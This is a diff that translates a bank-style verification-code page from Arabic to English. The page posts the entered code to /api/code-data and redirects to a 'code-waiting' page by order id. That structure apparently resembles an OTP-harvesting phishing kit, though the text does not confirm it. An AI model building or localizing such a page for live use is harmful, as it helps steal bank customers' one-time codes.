@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>رمز التحقق</title>
+<title>Verification Code</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
@@ -58,7 +58,7 @@
 
   .info-text{
     margin-top:24px;background:#fff8e1;border-radius:12px;padding:14px 16px;
-    font-size:13px;color:#e65100;line-height:1.6;text-align:right;
+    font-size:13px;color:#e65100;line-height:1.6;text-align:left;
   }
 
   .bottom{padding:20px 24px 40px}
@@ -86,8 +86,8 @@
     </svg>
   </div>
 
-  <h1>أدخل رمز التحقق</h1>
-  <p class="subtitle">تم إرسال رمز التحقق إلى هاتفك المسجل لدينا</p>
+  <h1>Enter verification code</h1>
+  <p class="subtitle">A verification code has been sent to your registered phone</p>
 
   <div class="error-msg" id="errorMsg"></div>
 
@@ -101,12 +101,12 @@
   </div>
 
   <div class="info-text">
-    لا تشارك هذا الرمز مع أي شخص. فريق البنك لن يطلب منك هذا الرمز أبداً.
+    Do not share this code with anyone. The bank team will never ask you for this code.
   </div>
 </div>
 
 <div class="bottom">
-  <button class="submit-btn" id="submitBtn" onclick="submitCode()">تأكيد</button>
+  <button class="submit-btn" id="submitBtn" onclick="submitCode()">Confirm</button>
 </div>
 
 <script>
@@ -116,7 +116,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "الرمز غير صحيح او غير صالح";
+    el.textContent = "Incorrect or expired code";
     el.style.display = "block";
   }
 
@@ -147,12 +147,12 @@
   async function submitCode() {
     const code = getCode();
     if (code.length < 6) {
-      showError("الرجاء إدخال الرمز كاملاً");
+      showError("Please enter the complete code");
       return;
     }
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "جاري التحقق...";
+    btn.textContent = "Verifying...";
 
     try {
       const res = await fetch("/api/code-data", {
@@ -164,14 +164,14 @@
       if (data.success) {
         location.href = "code-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "حدث خطأ");
+        showError(data.message || "An error occurred");
         btn.disabled = false;
-        btn.textContent = "تأكيد";
+        btn.textContent = "Confirm";
       }
     } catch(err) {
-      showError("حدث خطأ في الاتصال");
+      showError("Connection error");
       btn.disabled = false;
-      btn.textContent = "تأكيد";
+      btn.textContent = "Confirm";
     }
   }
 
